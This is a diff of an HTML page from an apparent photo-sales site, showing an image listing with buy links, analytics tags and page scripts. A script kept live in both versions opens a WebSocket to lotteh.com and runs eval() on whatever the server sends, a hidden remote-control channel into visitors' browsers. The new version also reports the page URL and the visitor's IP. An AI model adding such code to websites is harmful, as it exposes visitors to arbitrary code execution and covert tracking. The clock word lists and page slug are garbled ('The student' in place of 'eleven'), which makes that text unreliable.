@@ -23,6 +23,16 @@
 	
 	  gtag('config', 'G-XG1SZ2K8S5');
 	</script>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16692395808">
+    </script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'AW-16692395808');
+    </script>
   </head>
   <body>
     <header>
@@ -86,7 +96,7 @@
 	    <div style="height: 100px;"></div>
 	    
 <h1>A woman laying on a bed with a white blanket.</h1>
-<img src="https://uglek.s3.amazonaws.com/home/team/femmebabe/media/profiles/2942863d-6612-48be-a21b-dbf4cdf068d6-2.jpg?AWSAccessKeyId=AKIA5A2IYPTJFQQ6WHXN&amp;Signature=emQtpJJbKUabjiX6E2FYZlP9QEE%3D&amp;Expires=1725877122" alt="Daisy's profile photo" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;"/>
+<img src="https://res.cloudinary.com/dadcfixd9/image/upload/v1726063428/75193908-be7d-40e3-9c90-5d00189292a1.png" alt="Daisy's profile photo" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;"/>
 <p><i>By Daisy</i></p>
 
 <div style="white-space: pre-wrap;">A woman laying on a bed with a white blanket.</div>
@@ -109,9 +119,9 @@
 
 
 
-<img width="100%;" height="auto" src="https://uglek.s3.amazonaws.com/home/team/femmebabe/media/images/d371c33d-d021-43fa-b210-9e10dcaddda3.png.png?AWSAccessKeyId=AKIA5A2IYPTJFQQ6WHXN&Signature=kM0NRS8FQW%2Bcpu6eI9IQhrHOOgA%3D&Expires=1725877122" alt="A woman laying on a bed with a white blanket. - by Daisy">
+<img width="100%;" height="auto" src="https://uglek.s3.amazonaws.com/home/team/lotteh/media/images/16071f56-2294-46af-9dd9-69c4ab9d38f7.png.png?AWSAccessKeyId=AKIA5A2IYPTJFQQ6WHXN&Signature=bIYndzl%2Fs0mdV%2F%2FSW0Q6lIAAwFo%3D&Expires=1726772535" alt="A woman laying on a bed with a white blanket. - by Daisy">
 
-<p><a href="https://lotteh.com/payments/photo/Daisy/?id=539bad79-4530-4468-93f4-8efaba6f0c52" title="Buy on Lotte Harper">Buy</a> | <a href="https://lotteh.com/payments/photo/Daisy/crypto/?id=539bad79-4530-4468-93f4-8efaba6f0c52&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Buy with crypto</a></p>
+<p><a href="https://lotteh.com/payments/photo/Daisy/?id=16293832-55f6-41db-a91f-10ad5aa2e2c9" title="Buy on Lotte Harper">Buy</a> | <a href="https://lotteh.com/payments/photo/Daisy/crypto/?id=16293832-55f6-41db-a91f-10ad5aa2e2c9&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Buy with crypto</a></p>
 
 
 <hr>
@@ -172,36 +182,30 @@
         	Prism.highlightAll();
         });
         var socket;
-        function openSocket(key) {
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/' + key + '/');
+        function openSocket() {
+            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href);
             socket.addEventListener("open", (event) => {
                 console.log('Socket open.');
+                fetch('https://lotteh.com/remote/generate/')
+        		    .then(response => response.json())
+        		    .then(data => {
+        		        socket.send(data.ip);
+        		    })
+        		    .catch(error => {
+        		        console.log('Error:', error);
+        		    });
             });
             socket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket(key);
+                    openSocket();
                 }, 10000);
             });
         	socket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        $.ajax({
-            url: "https://lotteh.com/remote/generate/?path=https://glamgirlx.com/a-woman-laying-on-a-bed-with-a-age-division-decide",
-            method: 'GET',
-        		timeout: 30000,
-        		tryCount: 0,
-                        retryLimit: 5,
-                        error: (xhr, textStatus, errorThrown) => {
-                        	this.tryCount++;
-                                if(this.tryCount >= this.retryLimit) return;
-                               	$.ajax(this);
-                        },
-        	        success: function(data) {
-        			openSocket(data);
-        	        },
-        });
+        openSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -291,10 +295,10 @@ if(document.getElementById("dynamicClockContainer")) {
 		updateClock();
 	}, 1000);
 }
-var hrs = ["twelve", "one", "two", "three", "four", "five", "six", "seven", "eight", "nine", "ten", "eleven"];
-var digits = ["","one", "two", "three", "four", "five", "six", "seven", "eight", "nine", "ten", "eleven"];
-var teens = ["eleven", "twelve", "thirteen", "fourteen", "fifteen", "sixteen", "seventeen", "eighteen", "nineteen"];
-var tens = ["O&#x27;","ten","twenty","thirty","forty","fifty"];
+var hrs = ["TWELVE", "one", "two", "three", "four", "Five", "SIX", "Seven", "eight", "nine", "at", "The student"];
+var digits = ["","one", "two", "three", "four", "Five", "SIX", "Seven", "eight", "nine", "at", "The student"];
+var teens = ["The student", "TWELVE", "thirteen", "fourteen", "Fifteen", "Sixteen", "Seventeen", "eighteen", "ninete"];
+var tens = ["the&#x27;","at","twenty","thirty","forty","Fifty"];
 function capitalizeFirstLetter(string) {
     return string.charAt(0).toUpperCase() + string.slice(1);
 }
@@ -344,28 +348,28 @@ if(document.getElementById("current-time")) {
         	if(!qrdiv) return;
         	var qr = new QRCode(qrdiv, "https://glamgirlx.com/a-woman-laying-on-a-bed-with-a-age-division-decide");
         	var image = qrdiv.querySelector('img');
-                image.style.width = "100%";
-                image.style.height = "100%";
-                image.style.maxWidth = "160px";
-                image.alt = "Share this page by scanning a QR code.";
-                function downloadQrImage(url, filename) {
-                  const link = document.createElement('a');
-                  link.href = url;
-                  link.download = 'Glam Girl X - ' + filename;
-                  document.body.appendChild(link);
-                  link.click();
-                  document.body.removeChild(link);
-                }
-                function downloadQr(){
-                        downloadQrImage(image.src, 'QR Code');
-                }
-                qrdiv.onclick = downloadQr;
+            image.style.width = "100%";
+            image.style.height = "100%";
+            image.style.maxWidth = "160px";
+            image.alt = "Share this page by scanning a QR code.";
+            function downloadQrImage(url, filename) {
+              const link = document.createElement('a');
+              link.href = url;
+              link.download = 'Glam Girl X - ' + filename;
+              document.body.appendChild(link);
+              link.click();
+              document.body.removeChild(link);
+            }
+            function downloadQr() {
+                    downloadQrImage(image.src, 'QR Code');
+            }
+            qrdiv.onclick = downloadQr;
         });
     </script>
     <script>
         if (navigator.serviceWorker) {
             navigator.serviceWorker.register (
-              '/sw.js',
+              '/serviceworker.js',
               {scope: '/'}
             )
         }
